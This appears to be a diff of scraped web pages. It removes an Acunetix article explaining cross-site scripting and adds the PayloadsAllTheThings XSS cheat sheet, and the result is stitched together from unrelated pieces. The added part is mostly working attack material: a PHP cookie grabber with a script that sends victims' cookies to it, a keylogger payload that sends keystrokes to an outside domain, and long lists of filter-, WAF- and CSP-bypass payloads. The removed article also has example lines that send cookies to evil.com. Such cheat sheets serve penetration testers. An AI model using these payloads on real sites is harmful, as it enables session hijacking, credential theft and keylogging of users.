@@ -3,206 +3,569 @@ Role Name
 
 "></code></span></div><br>hello world</br><script>alert(document.cookie)</script>
 
-
-SKIP TO CONTENT
-TRY 
-BUY 
-COMPANY 
-SUPPORT 
-LEARN 
-GET DEMO
-Is Your Website Hackable?
-70% are. Detect and action with Acunetix
+Skip to content
  
+Search or jump to…
 
-Vulnerability Scanner
-Indepth Crawl & Analysis
-Highest Detection Rate
-Lowest False Positives
-Vulnerability Management
-WordPress Checks
-Network Security
-Advanced Features
-Cross-site Scripting (XSS) Attack
-Cross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.
+Needs Dev High
+Needs Dev Med
+Develing
+​
+Needs Test
+Testing
+ @chrismeyersfsu Sign out
+320
+3,165 1,066 swisskyrepo/PayloadsAllTheThings
+ Code  Issues 2  Pull requests 0  Projects 0  Wiki  Insights
+PayloadsAllTheThings/XSS injection/
+@swisskyrepo
+swisskyrepo SSRF Docker & Kubernetes
+Latest commit cfbe1a4  a day ago
+..		
+Files	SQLmap tips + Active Directory attacks + SQLite injections	5 months ago
+Intruders	Mimikatz + Credential Windows + XXE update	9 months ago
+README.md	SSRF Docker & Kubernetes	a day ago
+XSS in Angular.md	Markdown formatting update	8 days ago
+XSS with Relative Path Overwrite.md	Markdown formatting update	8 days ago
+ README.md
+Cross Site Scripting
+Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
 
-By leveraging XSS, an attacker does not target a victim directly. Instead, an attacker would exploit a vulnerability within a website or web application that the victim would visit, essentially using the vulnerable website as a vehicle to deliver a malicious script to the victim’s browser.
+Exploit code or POC
+Identify an XSS endpoint
+XSS in HTML/Applications
+XSS in wrappers javascript and data URI
+XSS in files
+Polyglot XSS
+Filter Bypass and Exotic payloads
+Common WAF Bypas
+Exploit code or POC
+Cookie grabber for XSS
 
-While XSS can be taken advantage of within VBScript, ActiveX and Flash (although now considered legacy or even obsolete), unquestionably, the most widely abused is JavaScript – primarily because JavaScript is fundamental to most browsing experiences.
+<?php
+// How to use it
+# <script>document.location='http://localhost/XSS/grabber.php?c=' + document.cookie</script>
 
-How Cross-site Scripting works
-In order to run malicious JavaScript code in a victim’s browser, an attacker must first find a way to inject a payload into a web page that the victim visits. Of course, an attacker could use social engineering techniques to convince a user to visit a vulnerable page with an injected JavaScript payload.
+// Write the cookie in a file
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fclose($fp);
 
-In order for an XSS attack to take place the vulnerable website needs to directly include user input in its pages. An attacker can then insert a string that will be used within the web page and treated as code by the victim’s browser.
+?>
+Keylogger for XSS
 
-The following server-side pseudo-code is used to display the most recent comment on a web page.
+<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
+More exploits at http://www.xss-payloads.com/payloads-list.html?a#category=all:
 
-print "<html>"
-print "<h1>Most recent comment</h1>"
-print database.latestComment
-print "</html>"
-The above script is simply printing out the latest comment from a comments database and printing the contents out to an HTML page, assuming that the comment printed out only consists of text.
+Taking screenshots using XSS and the HTML5 Canvas
+JavaScript Port Scanner
+Network Scanner
+.NET Shell execution
+Redirect Form
+Play Music
+Identify an XSS endpoint
+<script>debugger;</script>
+XSS in HTML/Applications
+XSS Basic
 
-The above page is vulnerable to XSS because an attacker could submit a comment that contains a malicious payload such as <script>doSomethingEvil();</script>.
+Basic payload
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
 
-Users visiting the web page will get served the following HTML page.
+Img payload
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+Svg payload
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+XSS for HTML5
+
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+XSS using script tag (external payload)
+
+<script src=14.rs>
+you can also specify an arbitratry payload with 14.rs/#payload
+e.g: 14.rs/#alert(document.domain)
+XSS in META tag
+
+Base64 encoded
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
+
+With an additional URL
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+XSS in Hidden input
+
+<input type="hidden" accesskey="X" onclick="alert(1)">
+Use CTRL+SHIFT+X to trigger the onclick event
+DOM XSS
+
+#"><img src=/ onerror=alert(2)>
+XSS in JS Context (payload without quote/double quote from @brutelogic
+
+-(confirm)(document.domain)//
+; alert(1);//
+XSS URL
+
+URL/<svg onload=alert(1)>
+URL/<script>alert('XSS');//
+URL/<input autofocus onfocus=alert(1)>
+XSS in wrappers javascript and data URI
+XSS with javascript:
+
+javascript:prompt(1)
+
+%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
+
+&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
+
+We can encode the "javacript:" in Hex/Octal
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+
+We can use a 'newline character'
+java%0ascript:alert(1)   - LF (\n)
+java%09script:alert(1)   - Horizontal tab (\t)
+java%0dscript:alert(1)   - CR (\r)
+
+Using the escape character
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+
+Using the newline and a comment //
+javascript://%0Aalert(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
+XSS with data:
+
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+XSS with vbscript: only IE
+
+vbscript:msgbox("XSS")
+XSS in files
+** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
+
+<name>
+  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
+</name>
+XSS in XML
 
 <html>
-<h1>Most recent comment</h1>
-<script>doSomethingEvil();</script>
+<head></head>
+<body>
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+</body>
 </html>
-When the page loads in the victim’s browser, the attacker’s malicious script will execute, most often without the user realizing or being able to prevent such an attack.
+XSS in SVG
 
-Important Note — An XSS vulnerability can only exist if the payload (malicious script) that the attacker inserts ultimately get parsed (as HTML in this case) in the victim’s browser
-What’s the worst an attacker can do with JavaScript?
-The consequences of what an attacker can do with the ability to execute JavaScript on a web page may not immediately stand out, especially since browsers run JavaScript in a very tightly controlled environment and that JavaScript has limited access to the user’s operating system and the user’s files.
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
-However, when considering that JavaScript has access to the following, it’s easier to understand how creative attackers can get with JavaScript.
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
+</svg>
+XSS in SVG (short)
 
-Malicious JavaScript has access to all the same objects the rest of the web page has, including access to cookies. Cookies are often used to store session tokens, if an attacker can obtain a user’s session cookie, they can impersonate that user.
-JavaScript can read and make arbitrary modifications to the browser’s DOM (within the page that JavaScript is running).
-JavaScript can use XMLHttpRequest to send HTTP requests with arbitrary content to arbitrary destinations.
-JavaScript in modern browsers can leverage HTML5 APIs such as accessing a user’s geolocation, webcam, microphone and even the specific files from the user’s file system. While most of these APIs require user opt-in, XSS in conjunction with some clever social engineering can bring an attacker a long way.
-The above, in combination with social engineering, allow attackers to pull off advanced attacks including cookie theft, keylogging, phishing and identity theft. Critically, XSS vulnerabilities provide the perfect ground for attackers to escalate attacks to more serious ones.
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
 
-“Isn’t Cross-site scripting the user’s problem?”
-If an attacker can abuse a XSS vulnerability on a web page to execute arbitrary JavaScript in a visitor’s browser, the security of that website or web application and its users has been compromised — XSS is not the user’s problem, like any other security vulnerability, if it’s affecting your users, it will affect you.
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+XSS in SWF flash application
 
-The anatomy of a Cross-site Scripting attack
-An XSS attack needs three actors — the website, the victim and the attacker.
+Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
+IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
+IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
+more payloads in ./files
 
-In the example below, it shall be assumed that the attacker’s goal is to impersonate the victim by stealing the victim’s cookie. Sending the cookie to a server the attacker controls can be achieved in a variety of ways, one of which is for the attacker to execute the following JavaScript code in the victim’s browser through an XSS vulnerability.
+XSS in SWF flash application
+
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
+swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
+swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
+plupload.flash.swf?%#target%g=alert&uid%g=XSS&
+moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\"));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
+bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
+flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
+phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
+XSS in CSS
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+div  {
+    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+    background-color: #cccccc;
+}
+</style>
+</head>
+  <body>
+    <div>lol</div>
+  </body>
+</html>
+Polyglot XSS
+Polyglot XSS - 0xsobky
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+Polyglot XSS - Ashar Javed
+
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+Polyglot XSS - Mathias Karlsson
+
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+Polyglot XSS - Rsnake
+
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+Polyglot XSS - Daniel Miessler
+
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+Polyglot XSS - @s0md3v https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg
+
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large
+
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+Filter Bypass and exotic payloads
+Bypass case sensitive
+
+<sCrIpt>alert(1)</ScRipt>
+Bypass tag blacklist
+
+<script x>
+<script x>alert('XSS')<script y>
+Bypass word blacklist with code evaluation
+
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
+
+<img src='1' onerror='alert(0)' <
+Bypass quotes for string
+
+String.fromCharCode(88,83,83)
+Bypass quotes in script tag
+
+http://localhost/bla.php?test=</script><script>alert(1)</script>
+<html>
+  <script>
+    <?php echo 'foo="text '.$_GET['test'].'";';`?>
+  </script>
+</html>
+Bypass quotes in mousedown event
+
+<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
+
+You can bypass a single quote with &#39; in an on mousedown event handler
+Bypass dot filter
+
+<script>window['alert'](document['domain'])<script>
+Bypass parenthesis for string - Firefox/Opera
+
+alert`1`
+setTimeout`alert\u0028document.domain\u0029`;
+Bypass onxxxx= blacklist
+
+<object onafterscriptexecute=confirm(0)>
+<object onbeforescriptexecute=confirm(0)>
+Bypass onxxx= filter with a null byte/vertical tab - IE/Safari
+
+<img src='1' onerror\x00=alert(0) />
+<img src='1' onerror\x0b=alert(0) />
+Bypass onxxx= filter with a '/' - IE/Firefox/Chrome/Safari
+
+<img src='1' onerror/=alert(0) />
+Bypass space filter with "/" - IE/Firefox/Chrome/Safari
+
+<img/src='1'/onerror=alert(0)>
+Bypass space filter with 0x0c/^L
+
+<svgonload=alert(1)>
+
+
+$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
+00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
+00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
+Bypass document blacklist
+
+<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
+Bypass using javascript inside a string
 
 <script>
-   window.location=“http://evil.com/?cookie=” + document.cookie
+foo="text </script><script>alert(1)</script>";
 </script>
-The figure below illustrates a step-by-step walkthrough of a simple XSS attack.
+Bypass using an alternate way to redirect
 
-Cross site scripting
+location="http://google.com"
+document.location = "http://google.com"
+document.location.href="http://google.com"
+window.location.assign("http://google.com")
+window['location']['href']="http://google.com"
+Bypass using an alternate way to execute an alert - @brutelogic
 
-The attacker injects a payload in the website’s database by submitting a vulnerable form with some malicious JavaScript
-The victim requests the web page from the website
-The website serves the victim’s browser the page with the attacker’s payload as part of the HTML body.
-The victim’s browser will execute the malicious script inside the HTML body. In this case it would send the victim’s cookie to the attacker’s server. The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives to the server, after which the attacker can use the victim’s stolen cookie for impersonation.
-Some examples of Cross-site Scripting attack vectors
-The following is a non-exhaustive list of XSS attack vectors that an attacker could use to compromise the security of a website or web application through an XSS attack. A more extensive list of XSS payload examples is maintained here.
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
 
-<script> tag
-The <script> tag is the most straight-forward XSS payload. A script tag can either reference external JavaScript code, or embed the code within the script tag.
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
+Bypass using an alternate way to execute an alert - @404death
 
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
 
-<!-- External script -->
-<script src=http://evil.com/xss.js></script>
-<!-- Embedded script -->
-<script> alert("XSS"); </script>
-<body> tag
-An XSS payload can be delivered inside <body> tag by using the onload attribute or other more obscure attributes such as the background attribute.
+constructor.constructor("aler"+"t(3)")();
+[].filter.constructor('ale'+'rt(4)')();
 
-<!-- onload attribute -->
-<body onload=alert("XSS")>
-<!-- background attribute -->
-<body background="javascript:alert("XSS")">
-<img> tag
-Some browsers will execute JavaScript when found in the <img>.
+top["al"+"ert"](5);
+top[8680439..toString(30)](7);
+top[/al/.source+/ert/.source](8);
+top['al\x65rt'](9);
 
-<!-- <img> tag XSS -->
-<img src="javascript:alert("XSS");">
-<!--  tag XSS using lesser-known attributes -->
-<img dynsrc="javascript:alert('XSS')">
-<img lowsrc="javascript:alert('XSS')">
-<iframe> tag
-The <iframe> tag allows the embedding of another HTML page into the parent page. An IFrame can contain JavaScript, however, it’s important to note that the JavaScript in the iFrame does not have access to the DOM of the parent’s page due to the browser’s Content Security Policy (CSP). However, IFrames are still very effective means of pulling off phising attacks.
+open('java'+'script:ale'+'rt(11)');
+location='javascript:ale'+'rt(12)';
 
-<!-- <iframe> tag XSS -->
-<iframe src=”http://evil.com/xss.html”>
-<input> tag
-In some browsers, if the type attribute of the <input> tag is set to image, it can be manipulated to embed a script.
+setTimeout`alert\u0028document.domain\u0029`;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+Bypass using an alternate way to trigger an alert
 
-<!-- <input> tag XSS -->
-<input type="image" src="javascript:alert('XSS');">
-<link> tag
-The <link> tag, which is often used to link to external style sheets could contain a script.
+var i = document.createElement("iframe");
+i.onload = function(){
+  i.contentWindow.alert(1);
+}
+document.appendChild(i);
 
-<!-- <link> tag XSS -->
-<link rel="stylesheet" href="javascript:alert('XSS');">
-<table> tag
-The background attribute of the table and td tags can be exploited to refer to a script instead of an image.
+// Bypassed security
+XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
+      var proxy = obj[name];
+      obj[name] = function () {
+        if (exec_original) {
+          return proxy.apply(this, arguments);
+        }
+      };
+      XSSObject.lockdown(obj, name);
+  };
+XSSObject.proxy(window, 'alert', 'window.alert', false);
+Bypass ">" using nothing #trololo (you don't need to close your tags)
 
-<!-- <table> tag XSS -->
-<table background="javascript:alert('XSS')">
-<!-- <td> tag XSS -->
-<td background="javascript:alert('XSS')">
-<div> tag
-The <div> tag, similar to the <table> and <td> tags can also specify a background and therefore embed a script.
+<svg onload=alert(1)//
+Bypass ';' using another character
 
-<!-- <div> tag XSS -->
-<div style="background-image: url(javascript:alert('XSS'))">
-<!-- <div> tag XSS -->
-<div style="width: expression(alert('XSS'));">
-<object> tag
-The <object> tag can be used to include in a script from an external site.
+'te' * alert('*') * 'xt';
+'te' / alert('/') / 'xt';
+'te' % alert('%') % 'xt';
+'te' - alert('-') - 'xt';
+'te' + alert('+') + 'xt';
+'te' ^ alert('^') ^ 'xt';
+'te' > alert('>') > 'xt';
+'te' < alert('<') < 'xt';
+'te' == alert('==') == 'xt';
+'te' & alert('&') & 'xt';
+'te' , alert(',') , 'xt';
+'te' | alert('|') | 'xt';
+'te' ? alert('ifelsesh') : 'xt';
+'te' in alert('in') in 'xt';
+'te' instanceof alert('instanceof') instanceof 'xt';
+Bypass using HTML encoding
 
-<!-- <object> tag XSS -->
-<object type="text/x-scriptlet" data="http://hacker.com/xss.html">
-Is your website or web application vulnerable to Cross-site Scripting?
-XSS vulnerabilities are amongst the most widespread web application vulnerabilities on the Internet. Fortunately, it’s easy to test if your website or web application is vulnerable to XSS and other vulnerabilities by running an automated web vulnerability scan using Acunetix. Download the 14-day free on premise trial, or register to our online service to run a scan against your website or web application.
+%26%2397;lert(1)
+Bypass using Katakana
 
-Further reading
-Types of XSS
+javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+Bypass using Octal encoding
 
-A comprehensive tutorial on Cross-site Scripting
+javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
+Bypass using Unicode
 
-XSS Prevention Cheat Sheet
+Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
+transformed into U+003C LESS­THAN SIGN (<)
 
-Subscribe for Updates
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (")
 
-Enter E-Mail
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (')
 
-Learn More
-Jenkins Plugin
-WordPress Hack
-Drupal Security
-Joomla! Security
-Web Security
-Website Audit
-HTML5 Website
-Web Service Security
-Blog Categories
-Web Security Zone
-Docs & FAQs
-News
-Releases
-Events
-Find Us on Facebook
+Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
+transformed into U+003C LESS­THAN SIGN (<)
 
-Product Information
-AcuSensor Technology
-AcuMonitor Technology
-Network Security Scanner
-Acunetix Integrations
-JavaScript Security
-Website Security
-Cross-site Scripting
-SQL Injection
-Reflected XSS
-CSRF Attacks
-Directory Traversal
-Learn More
-TLS Security
-Securing MySQL Server
-WordPress Security
-Web Service Security
-Prevent SQL Injection
-Documentation
-FAQs
-Videos
-Web Vulnerabilities
-Network Vulnerabilities
-Trojans and Backdoors
-© Acunetix, 2018
-Acunetix Online Login
-Privacy Policy
-Terms and Conditions
-Follow us on LinkedIn
-Follow us on Twiter
-Find us on Facebook
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (")
+
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (')
+
+E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
+%EF%BC%9E becomes >
+%EF%BC%9C becomes <
+Bypass using Unicode converted to uppercase
+
+İ (%c4%b0).toLowerCase() => i
+ı (%c4%b1).toUpperCase() => I
+ſ (%c5%bf) .toUpperCase() => S
+K (%E2%84%AA).toLowerCase() => k
+
+<ſvg onload=... > become <SVG ONLOAD=...>
+<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
+Bypass using overlong UTF-8
+
+< = %C0%BC = %E0%80%BC = %F0%80%80%BC
+> = %C0%BE = %E0%80%BE = %F0%80%80%BE
+' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
+" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
+" = %CA%BA
+' = %CA%B9
+Bypass using UTF-7
+
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+Bypass using UTF-16be
+
+%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
+\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
+Bypass using UTF-32
+
+%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+Bypass using BOM - Byte Order Mark (The page must begin with the BOM character.) BOM character allows you to override charset of the page
+
+BOM Character for UTF-16 Encoding:
+Big Endian : 0xFE 0xFF
+Little Endian : 0xFF 0xFE
+XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
+
+BOM Character for UTF-32 Encoding:
+Big Endian : 0x00 0x00 0xFE 0xFF
+Little Endian : 0xFF 0xFE 0x00 0x00
+XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+Bypass CSP using JSONP from Google (Trick by @apfeifer27) //google.com/complete/search?client=chrome&jsonp=alert(1);
+
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
+Bypass using weird encoding or native interpretation to hide the payload (alert())
+
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
